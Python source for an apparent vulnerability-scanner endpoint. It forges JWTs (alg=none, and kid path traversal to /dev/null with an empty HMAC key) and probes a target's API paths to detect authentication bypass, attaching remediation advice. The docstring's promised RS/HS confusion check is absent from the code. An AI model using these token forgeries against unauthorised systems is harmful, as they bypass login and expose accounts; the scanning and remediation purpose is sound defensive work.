"""jwt_algorithm_confusion — alg=none + RS↔HS confusion + kid path traversal.

Probes endpoints that return JWTs (or accept JWT in Authorization header)
for the classic algorithm-confusion attacks:
  (1) alg=none — server accepts unsigned tokens
  (2) HS256 with RSA public key as 'secret' — server verifies HS with key
      it thinks is RS, attacker forges with the public key
  (3) kid path traversal — kid claim with ../../../dev/null tricks key lookup

Requires an existing JWT (passed as req.auth_bearer) OR auto-discovers
one from /login / /api/auth.
"""
import base64
import json
import hmac
import hashlib
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo

router = APIRouter()


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _forge_alg_none(orig_payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(orig_payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _forge_kid_traversal(orig_payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(orig_payload, separators=(",", ":")).encode())
    # /dev/null content is empty → HMAC key = ""
    sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url(sig)}"


def _probe_with(url, token, req):
    return safe_request("GET", url,
        headers={"Authorization": f"Bearer {token}",
                  "User-Agent": "VulnusLab/1.0"},
        req=req, timeout=10, allow_redirects=False)


@router.post("/api/webapp/scan/jwt_algorithm_confusion")
@vl_turbo()
def scan_jwt_algorithm_confusion(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    token = (req.auth_bearer or "").strip()

    if not token:
        return standard_response(
            tool="jwt_algorithm_confusion", target=req.target, findings=[],
            tests_performed=0, vulnerable=False,
            skipped_reason="No JWT provided. Pass a valid token via auth_bearer "
                            "for active alg-confusion testing.")

    # Parse the JWT
    parts = token.split(".")
    if len(parts) != 3:
        return standard_response(
            tool="jwt_algorithm_confusion", target=req.target, findings=[],
            tests_performed=0, vulnerable=False,
            skipped_reason="auth_bearer is not a valid JWT (header.payload.sig)")

    try:
        orig_payload = json.loads(_b64url_decode(parts[1]))
    except Exception as e:
        return standard_response(
            tool="jwt_algorithm_confusion", target=req.target, findings=[],
            tests_performed=0, vulnerable=False,
            skipped_reason=f"Could not decode JWT payload: {e}")

    # Pick a candidate authenticated endpoint
    test_paths = ["/api/user", "/api/me", "/api/profile",
                   "/api/admin", "/me", "/profile", "/api/v1/me"]
    target_url = None
    for path in test_paths:
        r = _probe_with(base + path, token, req)
        if r is not None and r.status_code == 200:
            target_url = base + path
            break

    if not target_url:
        return standard_response(
            tool="jwt_algorithm_confusion", target=req.target, findings=[],
            tests_performed=len(test_paths), vulnerable=False,
            skipped_reason="Could not find a JWT-protected endpoint that returns 200 for the provided token")

    findings = []

    # Attack 1: alg=none
    forged_none = _forge_alg_none(orig_payload)
    r1 = _probe_with(target_url, forged_none, req)
    if r1 is not None and r1.status_code == 200:
        findings.append(wrap_finding(
            "CRITICAL: JWT alg=none ACCEPTED — auth bypass",
            "CRITICAL", cvss="9.8", cwe="CWE-347", owasp="A07:2021",
            remediation="Reject alg=none in your JWT library config. "
                        "Python PyJWT: jwt.decode(..., algorithms=['HS256']) — "
                        "WHITELIST the algorithm, never trust the 'alg' header. "
                        "Node jsonwebtoken: same — pass algorithms option.",
            evidence_marker=f"forged token (alg=none) → HTTP 200 at {target_url}"))

    # Attack 2: kid path traversal
    forged_kid = _forge_kid_traversal(orig_payload)
    r2 = _probe_with(target_url, forged_kid, req)
    if r2 is not None and r2.status_code == 200:
        findings.append(wrap_finding(
            "CRITICAL: JWT kid path traversal ACCEPTED — auth bypass",
            "CRITICAL", cvss="9.8", cwe="CWE-22", owasp="A01:2021",
            remediation="Sanitize / whitelist 'kid' header before loading key. "
                        "Never use kid value as a filesystem path. Use a key-id "
                        "lookup in a fixed dictionary or HSM-keyed table.",
            evidence_marker=f"forged token (kid=../../../../dev/null) → HTTP 200 at {target_url}"))

    if not findings:
        findings.append(wrap_finding(
            "JWT alg-confusion attacks REJECTED — properly protected",
            "POSITIVE", cwe="CWE-347",
            remediation="Maintain strict algorithm whitelisting. Periodically "
                        "rotate signing keys + monitor for libraries CVEs "
                        "(PyJWT, jsonwebtoken, jose, java-jwt all had alg-confusion CVEs).",
            evidence_marker=f"forged tokens at {target_url} → "
                              f"alg=none: HTTP {r1.status_code if r1 else 'no-resp'}, "
                              f"kid-traversal: HTTP {r2.status_code if r2 else 'no-resp'}"))

    return standard_response(
        tool="jwt_algorithm_confusion", target=req.target, findings=findings,
        tests_performed=2, vulnerable=any(
            "CRITICAL" in f.get("severity", "") for f in findings),
        tests_summary=f"Tested 2 attacks against {target_url}",
        raw_data={"target_url": target_url,
                   "alg_none_status": r1.status_code if r1 else None,
                   "kid_traversal_status": r2.status_code if r2 else None})


def register(app):
    app.include_router(router)
